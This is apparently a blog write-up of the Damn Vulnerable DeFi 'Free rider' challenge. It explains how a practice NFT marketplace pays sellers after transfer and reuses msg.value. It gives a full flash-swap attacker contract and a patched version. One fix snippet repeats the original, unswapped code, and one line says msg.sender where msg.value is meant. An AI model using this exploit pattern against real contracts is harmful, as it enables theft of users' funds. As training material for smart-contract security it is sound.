---
layout: post
title: Damn Vulnerable DeFi - Free rider
---

## Description
A new marketplace of Damn Valuable NFTs has been released! There's been an initial mint of 6 NFTs, which are available for sale in the marketplace. Each one at 15 ETH.

A buyer has shared with you a secret alpha: the marketplace is vulnerable and all tokens can be taken. Yet the buyer doesn't know how to do it. So it's offering a payout of 45 ETH for whoever is willing to take the NFTs out and send them their way.

You want to build some rep with this buyer, so you've agreed with the plan.

Sadly you only have 0.5 ETH in balance. If only there was a place where you could get free ETH, at least for an instant.

## Solution
The vulnerability here is pretty glaring. The marketplace pays the owner of the NFT **after** transfer, so the
payment goes to the new owner and the seller gets nothing.

```
// transfer from seller to buyer
token.safeTransferFrom(token.ownerOf(tokenId), msg.sender, tokenId);

// pay seller
payable(token.ownerOf(tokenId)).sendValue(priceToPay);
```

Another error is the way the contract checks the amount paid:

```
require(msg.value >= priceToPay, "Amount paid is not enough");
```

Does this really ensure the full price is paid for the NFTs? No, it doesn't.
`msg.value` is reused for each purchase, so a "payment" for the previous purchase doesn't decrease the amount you have left for the next purchase. As an example, suppose there are 10 NFTs that cost
5 ETH each. I could call `buyMany` for the 10 NFTs and pass in 5 ETH for `msg.value`. The
`require(msg.value >= priceToPay, "Amount paid is not enough");` will pass on every iteration of `_buyOne`, even though I've only paid 5 ETH instead of 50.

With this knowledge, we can exploit the marketplace as follows:

1. Take out a flash loan on Uniswap
2. Sweep the NFTs in a single call to `buyMany`. For this call we only have to send enough ether to cover the cost of 1 NFT.
3. Transfer the NFTs to the buyer
4. Repay the flash loan

```
contract FreeRiderAttacker is IERC721Receiver {
    address payable private weth;
    IUniswapV2Pair private uniswapV2Pair;
    address private factoryV2;
    FreeRiderNFTMarketplace private nftMarketPlace;
    FreeRiderBuyer private freeRiderBuyer;
    DamnValuableNFT private damnValuableNft;

    function attack(
        address _factoryV2,
        address payable _weth,
        address _uniswapV2Pair,
        address payable _nftMarketPlace,
        address _freeRiderBuyer,
        address _damnValuableNft
    ) external payable
    {
        factoryV2 = _factoryV2;
        weth = _weth;
        uniswapV2Pair = IUniswapV2Pair(_uniswapV2Pair);
        nftMarketPlace = FreeRiderNFTMarketplace(_nftMarketPlace);
        freeRiderBuyer = FreeRiderBuyer(_freeRiderBuyer);
        damnValuableNft = DamnValuableNFT(_damnValuableNft);

        // Let's flash swap 15 weth. This calls our uniswapV2Call callback
        uniswapV2Pair.swap(15 ether, 0, address(this), "0x01");

        // The exploit is over, send the attacker the spoils
        payable(msg.sender).transfer(address(this).balance);
    }

    function uniswapV2Call(address, uint amount0, uint, bytes calldata) external {
        // Get ETH for WETH
        (bool success,) = weth.call(abi.encodeWithSignature("withdraw(uint256)", amount0));
        require(success, "weth withdraw failed :(");

        // Buy and transfer the NFTs
        uint256[] memory buys = new uint256[](6);
        for (uint256 i = 0; i < 6; ++i) {
            buys[i] = i;
        }
        nftMarketPlace.buyMany{value: 15 ether}(buys);

        for (uint256 i = 0; i < 6; ++i) {
            damnValuableNft.safeTransferFrom(address(this), address(freeRiderBuyer), uint256(i));
        }

        // Make the swap whole
        uint256 amountToReturn = amount0 * 1000 / 997 + 1;
        (success,) = weth.call{value: amountToReturn}(abi.encodeWithSignature("deposit()"));
        require(success, "weth deposit failed :(");
        (success,) = weth.call(abi.encodeWithSignature("transfer(address,uint256)", msg.sender, amountToReturn));
        require(success, "weth transfer failed :(");
    }

    // Implement this so we can receive NFTs via safeTransferFrom
    function onERC721Received(address, address, uint256, bytes memory) external pure override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    // Implement this so we can receive ETH payments
    receive() external payable {}
}
```

## Patched Contract
We need to fix two things here:
1. Pay the seller before transferring ownership
2. Decrement the funds available for payment instead of reusing msg.sender on every purchase

Fix one is easy. We just swap the two lines from the previous section

```
// transfer from seller to buyer
token.safeTransferFrom(token.ownerOf(tokenId), msg.sender, tokenId);

// pay seller
payable(token.ownerOf(tokenId)).sendValue(priceToPay);
```

For fix two let's store `msg.value` in a variable when `buyMany` is called. Call it `fundsForPurchase`.
For each purchase we'll decrease `fundsForPurchase` by the amount paid. This
ensures the buyer pays the full price for each NFT.

Here's the patched contract.

```
contract FreeRiderNFTMarketplaceV2 is ReentrancyGuard {

    using Address for address payable;

    DamnValuableNFT public token;
    uint256 public amountOfOffers;

    // tokenId -> price
    mapping(uint256 => uint256) private offers;

    event NFTOffered(address indexed offerer, uint256 tokenId, uint256 price);
    event NFTBought(address indexed buyer, uint256 tokenId, uint256 price);
    
    constructor(uint8 amountToMint) payable {
        require(amountToMint < 256, "Cannot mint that many tokens");
        token = new DamnValuableNFT();

        for(uint8 i = 0; i < amountToMint; i++) {
            token.safeMint(msg.sender);
        }        
    }

    function offerMany(uint256[] calldata tokenIds, uint256[] calldata prices) external nonReentrant {
        require(tokenIds.length > 0 && tokenIds.length == prices.length);
        for (uint256 i = 0; i < tokenIds.length; i++) {
            _offerOne(tokenIds[i], prices[i]);
        }
    }

    function _offerOne(uint256 tokenId, uint256 price) private {
        require(price > 0, "Price must be greater than zero");

        require(
            msg.sender == token.ownerOf(tokenId),
            "Account offering must be the owner"
        );

        require(
            token.getApproved(tokenId) == address(this) ||
            token.isApprovedForAll(msg.sender, address(this)),
            "Account offering must have approved transfer"
        );

        offers[tokenId] = price;

        amountOfOffers++;

        emit NFTOffered(msg.sender, tokenId, price);
    }

    function buyMany(uint256[] calldata tokenIds) external payable nonReentrant {
        uint256 fundsForPurchases = msg.value;
        for (uint256 i = 0; i < tokenIds.length; i++) {
            uint256 pricePaid = _buyOne(tokenIds[i], fundsForPurchases);
            fundsForPurchases -= pricePaid;
        }
    }

    function _buyOne(uint256 tokenId, uint256 fundsForPurchase) private returns (uint256 pricePaid) {       
        uint256 priceToPay = offers[tokenId];
        require(priceToPay > 0, "Token is not being offered");

        require(fundsForPurchase >= priceToPay, "Amount paid is not enough");

        amountOfOffers--;

        // pay seller
        payable(token.ownerOf(tokenId)).sendValue(priceToPay);

        // transfer from seller to buyer
        token.safeTransferFrom(token.ownerOf(tokenId), msg.sender, tokenId);

        emit NFTBought(msg.sender, tokenId, priceToPay);

        return priceToPay;
    }    

    receive() external payable {}
}
```